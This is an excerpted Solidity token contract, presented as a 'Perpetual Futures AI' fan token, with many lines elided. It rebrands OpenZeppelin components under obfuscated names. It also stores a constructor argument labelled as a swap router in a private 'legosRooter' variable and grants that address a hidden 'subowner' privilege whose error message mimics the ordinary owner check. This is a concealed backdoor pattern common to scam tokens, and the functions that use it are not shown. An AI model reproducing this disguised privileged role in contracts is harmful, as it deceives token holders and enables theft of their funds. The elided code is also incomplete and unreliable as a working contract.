...
/// https://x.com/PerpetualFuturesAI


pragma solidity 0.8.29;

// PerpetualFuturesAI fan token

interface PerpetualFuturesAIinterface {
  /**
...
/*
 * @dev Provides information about the current execution PerpetualFuturesAI20Burnable, including the
 ...
 */
abstract contract PerpetualFuturesAI20Burnable {
...
// File: @openzeppelin/contracts/access/PerpetualFuturesAI20Ownable.sol
 ...
 * the owner.
 */
abstract contract PerpetualFuturesAI20Ownable is PerpetualFuturesAI20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "PerpetualFuturesAI20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "PerpetualFuturesAI20Ownable: new owner is the zero address");
 ...
 * `SafePerpetualFuturesAI` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafePerpetualFuturesAI {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafePerpetualFuturesAI: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafePerpetualFuturesAI: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafePerpetualFuturesAI: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafePerpetualFuturesAI: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafePerpetualFuturesAI: modulo by zero");
  }
...
contract PerpetualFuturesAIToken is PerpetualFuturesAI20Burnable, PerpetualFuturesAIinterface, PerpetualFuturesAI20Ownable {
    
    using SafePerpetualFuturesAI for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _name = "Perpetual Futures AI";
        _symbol = "Perpetual Futures AI";
        _decimals = 9;
    ...
    */
    ...
    /**
    * @dev See {PerpetualFuturesAIinterface-totalSupply}.
    */
    ...
    /**
    * @dev See {PerpetualFuturesAIinterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "PerpetualFuturesAI20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {PerpetualFuturesAIinterface-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {PerpetualFuturesAIinterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {PerpetualFuturesAIinterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {PerpetualFuturesAIinterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {PerpetualFuturesAIinterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "PerpetualFuturesAIinterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {PerpetualFuturesAIinterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "PerpetualFuturesAIinterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "PerpetualFuturesAIinterface: transfer from the zero address");
        require(shippingto != address(0), "PerpetualFuturesAIinterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "PerpetualFuturesAIinterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "PerpetualFuturesAIinterface: approve from the zero address");
        require(transporteur != address(0), "PerpetualFuturesAIinterface: approve to the zero address");
